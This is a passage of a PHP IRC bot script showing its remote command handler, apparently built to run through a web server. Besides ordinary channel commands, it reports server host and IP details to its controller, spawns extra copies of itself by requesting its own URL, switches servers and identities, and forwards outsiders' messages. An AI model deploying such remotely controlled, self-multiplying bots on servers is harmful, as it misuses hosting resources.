               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' Who Are U!!?? ' . CRL); }
             }
             elseif ($com[3]==':whoami' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :You are my boss '.$dNick.'!!! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' Who Are U!!?? ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' xixixixixixi'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`nick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`load') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx();

?>



